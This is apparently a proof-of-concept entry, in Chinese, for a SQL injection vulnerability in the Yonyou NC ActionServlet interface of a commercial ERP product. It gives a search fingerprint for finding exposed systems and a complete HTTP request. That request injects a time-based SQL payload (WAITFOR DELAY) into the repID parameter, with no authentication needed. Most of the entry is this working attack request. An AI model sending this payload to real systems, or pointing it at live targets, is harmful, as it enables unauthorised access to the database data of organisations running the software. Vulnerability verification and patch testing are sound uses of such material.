﻿# 用友NC-com.ufida.web.action.ActionServlet SQL注入漏洞

> 更新时间：2024-04-13

> 漏洞编号：

> 漏洞说明：用友NC-com.ufida.web.action.ActionServlet接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用SQL 注入漏洞获取数据库敏感信息。

> 漏洞特征：app="用友-UFIDA-NC"

> 验证脚本：HTTP

```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:5'--+&unitID=public HTTP/1.1
SOAPAction: http://tempuri.org/GetHomeInfo
Accept-Encoding: identity
Accept: */*
Connection: keep-alive
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友NC-com.ufida.web.action.ActionServlet SQL注入漏洞.poc

